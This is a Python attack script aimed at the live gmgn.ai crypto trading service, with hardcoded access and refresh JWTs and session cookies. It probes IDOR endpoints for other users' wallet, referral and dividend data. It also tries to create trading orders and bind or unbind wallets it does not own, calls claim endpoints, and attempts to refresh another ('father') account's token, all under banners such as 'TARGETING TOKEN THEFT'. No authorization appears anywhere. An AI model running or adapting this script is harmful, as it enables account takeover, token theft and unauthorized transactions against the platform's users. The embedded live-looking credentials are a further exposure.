#!/usr/bin/env python3
"""Deep token hunting with the FRESH token from refresh response."""
import json
import requests
import time

# FRESH TOKEN from the refresh response (expires 1783871174)
ACCESS_TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL2FjY2VzcyIsImRhdGEiOnsidXNlcl9pZCI6IjhhNGMzZDYzLTg4ZmEtNDZjYy05ODRhLWU4ODVkNGFmZDFiNSIsImNsaWVudF9pZCI6ImdtZ25fd2ViXzIwMjYwNzEwLTE5NzItOWY0OWM4ZiIsImRldmljZV9pZCI6ImFjZjg5OGM3LTUwNjMtNGQwZi1iOTkyLWQxZTVkNTY4NDA5ZSIsImZhdGhlcl9pZCI6ImUzZDg1ZjU5LWMxMDUtNDA0My1hMDYwLTlhNmYxMGU3OWVmNyIsImZpbmdlcnByaW50IjoidjFmMTYwODU4OWNmZDU3Yjk1MDQzNDVhYTgyZGNlYTQxMiIsImFwcCI6ImdtZ24iLCJwbGF0Zm9ybSI6IndlYiJ9LCJleHAiOjE3ODM4NzExNzQsImlhdCI6MTc4Mzg2OTM3NCwiaXNzIjoiZ21nbi5haS9zaWduZXIiLCJqdGkiOiIyY2U4ZGUxYy1kNmIzLTQ4NDQtOWEwZS00NTRmYTU3YmZlOWIiLCJuYmYiOjE3ODM4NjkzNzQsInN1YiI6ImdtZ24uYWkvYWNjZXNzIiwidXNlcl9pZCI6IjhhNGMzZDYzLTg4ZmEtNDZjYy05ODRhLWU4ODVkNGFmZDFiNSIsInZlciI6IjEuMCJ9._L3vlOktOBNkkkbsDkb2vpoxjCqCAZ6jT2l_pVD0T_TjrvOXBEykZRZhzOAxY7fhr-ygabdgKIjRK4A4lmRceQ"

REFRESH_TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiI4YTRjM2Q2My04OGZhLTQ2Y2MtOTg0YS1lODg1ZDRhZmQxYjUiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxMC0xOTcyLTlmNDljOGYiLCJkZXZpY2VfaWQiOiJhY2Y4OThjNy01MDYzLTRkMGYtYjk5Mi1kMWU1ZDU2ODQwOWUiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxZjE2MDg1ODljZmQ1N2I5NTA0MzQ1YWE4MmRjZWE0MTIiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2MzI1ODI5LCJpYXQiOjE3ODM3MzM4MjksImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiZTNkODVmNTktYzEwNS00MDQzLWEwNjAtOWE2ZjEwZTc5ZWY3IiwibmJmIjoxNzgzNzMzODI5LCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiOGE0YzNkNjMtODhmYS00NmNjLTk4NGEtZTg4NWQ0YWZkMWI1IiwidmVyIjoiMS4wIn0.T-souQasgFY_CMVReqltxNdrYqa0qPOozLdbvc95nO7WgrAyn-bNhBXayi50IRvYG2kX5kmd3-wHEwY8jSqWag"

COOKIES = {
    "_ga_UGLVBMV4Z0": "GS1.2.1783868828922928.d557456dab82a63259179cf5603c7cb8.2et19uuic9LyMBph5Cx3hQ%3D%3D.mIlh9tL7rCIb2reoLkDLSA%3D%3D.NPARXjz5FNHX6j%2BVfQ4NyQ%3D%3D.V7iy1IQ16P92AotWIN9BjQ%3D%3D",
    "__cf_bm": "j_lS0Oscc4a0_D5Yn.nzhtaJpsJLgahl.qF9h1fJUuA-1783868831.6090767-1.0.1.1-iGgjPq_FDdPkkmhVdjThsxiacp4AYJCX5UtvDc4_w0LLXNqxGSlKq9EikgRmFAJSDr9Wc1NcKC1YhLPmejETCneXHyynzrMdC25Wbfm2NgnaqgV.M_rPFnN.poiDuvkC",
    "_ga": "GA1.1.1499118900.1783283677",
    "_csrf": "zp-fQVg4uAYlEsx7cronE5kO3GM4xIln",
    "_did": "c800ab0b7d01aa37bc93aacdcbce271e",
    "_wt": "AWpa2MXrjj0uvG6i4MZw3ZLOqVnU803QqMIf1eo",
    "sid": "gmgn|df83ac2f9a7e02144cb10ded0c21ad5c",
}

H = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

YOUR_USER_ID = "8a4c3d63-88fa-46cc-984a-e885d4afd1b5"
FATHER_ID = "e3d85f59-c105-4043-a060-9a6f10e79ef7"

def check_for_tokens(text, name):
    """Look for token patterns in response."""
    lower = text.lower()
    
    if "eyj" in lower:
        print(f"   🔥 JWT PATTERN FOUND in {name}!")
        # Find the actual JWT
        start = text.lower().find("eyj")
        if start != -1:
            potential_token = text[start:start+500]
            print(f"   Token snippet: {potential_token[:100]}...")
    
    keywords = ["access_token", "refresh_token", "bearer", "api_key", "apikey", "secret", "session_token"]
    for kw in keywords:
        if kw in lower:
            print(f"   ⚠️ Keyword '{kw}' found in {name}")
    
    return "eyj" in lower

def test(name, method, url, payload=None, check_tokens=True):
    """Test endpoint."""
    print(f"\n[{name}]")
    
    try:
        if method == "GET":
            r = requests.get(url, headers=H, cookies=COOKIES, timeout=10)
        else:
            r = requests.post(url, headers=H, cookies=COOKIES, json=payload or {}, timeout=10)
        
        print(f"  Status: {r.status_code}")
        
        if r.status_code == 200:
            print(f"  ✅ SUCCESS!")
            
            if check_tokens:
                check_for_tokens(r.text, name)
            
            try:
                d = r.json()
                print(f"  Data: {json.dumps(d, indent=2)[:800]}")
                return d
            except:
                print(f"  Body: {r.text[:500]}")
                return r.text
        else:
            err = r.text[:200]
            print(f"  Error: {err}")
            if check_tokens:
                check_for_tokens(err, name)
            
    except Exception as e:
        print(f"  Exception: {e}")
    
    return None


print("="*80)
print("🔥 DEEP TOKEN HUNT - TARGETING TOKEN THEFT")
print("="*80)
print(f"Fresh token expires: 1783871174")
print(f"Current timestamp: {int(time.time())}")
print(f"Time remaining: {1783871174 - int(time.time())} seconds")

# ============================================================================
# CRITICAL: Test endpoints from Jack's research that WORK
# ============================================================================
print("\n" + "="*80)
print("🎯 CONFIRMED WORKING ENDPOINTS (from your research)")
print("="*80)

# F2 - Dividend info (WORKS - proven)
print("\n[*] F2: Dividend Info Disclosure (proven IDOR)")
wallets_to_test = [
    "0x10ED43C718714eb63d5aA57B78B54704E256024E",  # PancakeSwap (has $0.59)
    "0x8894E0a0c962CB723c1976a4421c95949bE2D4E3",  # Binance
]

for w in wallets_to_test:
    test(f"dividend_{w[:10]}", "POST", 
         "https://gmgn.ai/xapi/v1/bsc/flap/dividend_info",
         {"from_address": w})

# Try other F2 endpoints
f2_endpoints = [
    ("cashback", "https://gmgn.ai/xapi/v1/bsc/flap/cashback_info"),
    ("referral", "https://gmgn.ai/xapi/v1/bsc/flap/referral_info"),
    ("invite", "https://gmgn.ai/xapi/v1/bsc/flap/referral_invite_info"),
]

for name, url in f2_endpoints:
    test(f"F2_{name}", "POST", url, {"from_address": wallets_to_test[0]})

# ============================================================================
# ATTACK: Try to get OTHER users' referral data (may include tokens)
# ============================================================================
print("\n" + "="*80)
print("💀 ATTACK: Referral Data Cross-Reference")
print("="*80)

# First scrape wallets with referral codes
print("[*] Finding wallets with active referral codes...")
try:
    r = requests.get(
        "https://gmgn.ai/defi/quotation/v1/rank/bsc/swaps/24h?limit=20",
        headers=H, cookies=COOKIES, timeout=10
    )
    if r.status_code == 200:
        d = r.json()
        wallets = [w["address"] for w in d["data"]["rank"][:10]]
        print(f"✅ Got {len(wallets)} wallets\n")
        
        # Test invite_info for each (may leak user session data)
        for wallet in wallets[:5]:
            result = test(
                f"invite_{wallet[:10]}",
                "POST",
                "https://gmgn.ai/tapi/v1/fourmeme/invite_info",
                {"chain": "bsc", "from_address": wallet},
                check_tokens=True
            )
            
            # If successful, check if response contains tokens
            if result and isinstance(result, dict):
                response_str = json.dumps(result)
                if "token" in response_str.lower() or "key" in response_str.lower():
                    print(f"   💀💀💀 POTENTIAL TOKEN LEAK in invite_info!")
except:
    pass

# ============================================================================
# ATTACK: Trading Bot Endpoints (confirmed IDOR from research)
# ============================================================================
print("\n" + "="*80)
print("💀 ATTACK: Trading Bot Order Creation (test for token leaks)")
print("="*80)

# Try to create order for NON-OWNED wallet (from research - IDOR confirmed)
test(
    "trading_bot_IDOR",
    "POST",
    "https://gmgn.ai/tapi/v1/trading_bot/limit_order/create",
    {
        "chain": "bsc",
        "wallet_address": "0x10ED43C718714eb63d5aA57B78B54704E256024E",
        "base_token": "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82",
        "quote_token": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
        "order_type": "buy",
        "sub_order_type": "take_profit",
        "slippage": 50,
        "gas_price": "5000000000",
        "order_data": {
            "amount": "1000000000000000",
            "price": "0.00001",
            "trigger_price": "0.00001"
        }
    },
    check_tokens=True
)

# ============================================================================
# ATTACK: Claim endpoints (F3/F4/F5 from research)
# ============================================================================
print("\n" + "="*80)
print("💀 ATTACK: Claim Endpoints (check for raw_tx with tokens)")
print("="*80)

# F3 - Dividend claim
test(
    "F3_dividend_claim",
    "POST",
    "https://gmgn.ai/tapi/v1/flap/dividend_claim",
    {"chain": "bsc", "from_address": wallets_to_test[0]},
    check_tokens=True
)

# F4 - Solana claiming (returns raw_tx)
test(
    "F4_solana_claim",
    "POST",
    "https://gmgn.ai/xapi/v1/sol/claiming",
    {"chain": "sol", "dex": "pump", "from_address": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"},
    check_tokens=True
)

# F5 - Fee claim
test(
    "F5_fee_claim",
    "POST",
    "https://gmgn.ai/tapi/v1/fourmeme/fee_claim",
    {"chain": "bsc", "from_address": wallets_to_test[0]},
    check_tokens=True
)

# ============================================================================
# ATTACK: Solana claim detail (may expose wallet keys)
# ============================================================================
print("\n" + "="*80)
print("💀 ATTACK: Solana Claim Details")
print("="*80)

test(
    "sol_claim_detail",
    "POST",
    "https://gmgn.ai/xapi/v1/sol/get_claim_detail",
    {"address": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"},
    check_tokens=True
)

# ============================================================================
# ATTACK: MPC wallet bind (A-class from research - may expose keys)
# ============================================================================
print("\n" + "="*80)
print("💀 ATTACK: MPC Wallet Binding Flow")
print("="*80)

# From your research: postNonce → verify_wallet_signature → bind_wallet
mpc_endpoints = [
    ("post_nonce", "https://gmgn.ai/account/mpc/post_nonce", {}),
    ("bind_wallet", "https://gmgn.ai/account/mpc/bind_wallet", {
        "chain": "bsc",
        "wallet_address": "0x10ED43C718714eb63d5aA57B78B54704E256024E"
    }),
    ("unbind_wallet", "https://gmgn.ai/account/mpc/unbind_wallet", {
        "chain": "bsc", 
        "wallet_address": "0x10ED43C718714eb63d5aA57B78B54704E256024E"
    }),
]

for name, url, payload in mpc_endpoints:
    test(f"MPC_{name}", "POST", url, payload, check_tokens=True)

# ============================================================================
# ATTACK: Look for father_id relationship (token inheritance?)
# ============================================================================
print("\n" + "="*80)
print("💀 ATTACK: Father ID Relationship (from JWT)")
print("="*80)

print(f"[*] Your user_id: {YOUR_USER_ID}")
print(f"[*] Your father_id: {FATHER_ID}")
print(f"[*] Testing if father_id exposes parent account tokens...\n")

# Try to access father account data
test(
    "father_user_data",
    "POST",
    "https://gmgn.ai/account/user_info",
    {"user_id": FATHER_ID},
    check_tokens=True
)

# Try to get father's wallets
test(
    "father_wallets",
    "POST",
    "https://gmgn.ai/account/wallet_list",
    {"user_id": FATHER_ID},
    check_tokens=True
)

# Try father's dividend data
test(
    "father_dividends",
    "POST",
    "https://gmgn.ai/xapi/v1/bsc/flap/dividend_info",
    {"user_id": FATHER_ID},
    check_tokens=True
)

# ============================================================================
# FINAL: Try to refresh SOMEONE ELSE'S token
# ============================================================================
print("\n" + "="*80)
print("💀💀💀 NUCLEAR: Try to refresh FATHER's access token")
print("="*80)

# Try to use YOUR refresh token to get FATHER's access token
test(
    "NUCLEAR_refresh_father",
    "POST",
    "https://gmgn.ai/account/account/refresh_access_token",
    {"refresh_token": REFRESH_TOKEN, "user_id": FATHER_ID},
    check_tokens=True
)

print("\n" + "="*80)
print("📊 DEEP TOKEN HUNT COMPLETE")
print("="*80)
print("\nLook for:")
print("  🔥 JWT patterns (eyJ...)")
print("  💀 200 responses with token keywords")
print("  ⚠️ Raw transaction data (may contain keys)")
